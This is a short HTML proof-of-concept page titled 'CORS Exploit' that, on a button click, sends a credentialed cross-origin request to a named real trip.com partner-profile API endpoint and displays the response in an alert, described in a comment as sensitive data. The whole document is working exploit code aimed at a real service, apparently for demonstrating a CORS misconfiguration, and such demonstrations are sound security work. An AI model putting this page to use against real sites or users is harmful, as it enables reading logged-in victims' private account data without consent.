<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit</title>
</head>
<body>
    <script>
        function exploit() {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://www.trip.com/restapi/soa2/18073/json/queryPartnerProfileDetails', true);
            xhr.withCredentials = true; // Include credentials
            xhr.onload = function() {
                if (xhr.status == 200) {
                    alert(xhr.responseText); // This alert would show the sensitive data
                }
            };
            xhr.setRequestHeader('Origin', 'http://localhost');
            xhr.send();
        }
    </script>
    <button onclick="exploit()">Exploit CORS</button>
</body>
